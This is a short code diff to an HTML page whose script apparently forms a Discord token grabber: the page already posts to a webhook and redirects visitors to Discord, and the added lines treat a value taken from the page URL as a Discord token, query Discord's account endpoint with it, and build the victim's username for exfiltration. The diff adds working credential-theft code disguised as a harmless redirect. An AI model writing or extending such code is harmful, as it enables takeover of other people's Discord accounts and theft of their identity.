@@ -97,6 +97,21 @@ fetch(webhookURL, {
 function handleOnLoad(){
 window.location="https://discord.com/channels/@me";
 }
+
+async function getDiscordAccountInfo(token) {
+  const response = await fetch('https://discord.com/api/users/@me', {
+    headers: {
+      'Authorization': `${token}`
+    }
+  });
+  const accountInfo = await response.json();
+  return accountInfo;
+}
+const token = currentURL;
+const accountInfo = await getDiscordAccountInfo(token);
+var info = `Username: ${accountInfo.username}#${accountInfo.discriminator}`
+
+
 </script>
 </head>
 <body onload="handleOnLoad()">
